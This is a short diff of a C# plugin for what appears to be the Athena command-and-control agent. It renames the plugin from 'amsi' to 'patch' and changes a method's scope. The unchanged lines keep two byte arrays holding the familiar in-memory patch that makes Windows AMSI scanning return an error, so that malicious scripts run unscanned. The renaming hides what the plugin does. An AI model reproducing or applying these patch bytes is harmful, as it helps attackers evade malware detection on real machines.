@@ -6,7 +6,7 @@ namespace Plguins
 {
     public class Plugin : AthenaPlugin
     {
-        public override string Name => "amsi";
+        public override string Name => "patch";
         byte[] sword = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
         byte[] spear = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
@@ -53,7 +53,7 @@ namespace Plguins
                 PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
             }
         }
-        private static bool SpearAndShield(byte[] shield)
+        private bool SpearAndShield(byte[] shield)
         {
             try
             {
